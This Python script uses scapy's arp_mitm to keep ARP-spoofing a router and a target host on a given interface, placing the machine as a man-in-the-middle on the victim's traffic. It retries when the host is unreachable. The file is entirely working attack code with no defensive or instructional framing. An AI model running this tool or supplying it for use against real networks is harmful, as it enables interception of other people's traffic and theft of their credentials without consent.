import time
import sys
from scapy.all import arp_mitm # type: ignore
from termcolor import cprint # type: ignore


def run(routerip, targetip, interface):
    cprint('*** MITM running ***', 'green', attrs=['blink', 'reverse'])
    while True:
        try:
            arp_mitm(routerip, targetip, iface=interface)

        except OSError:
            print("IP seems down..")
            time.sleep(1)
        except KeyboardInterrupt:
            print("Exiting...")
            sys.exit(2)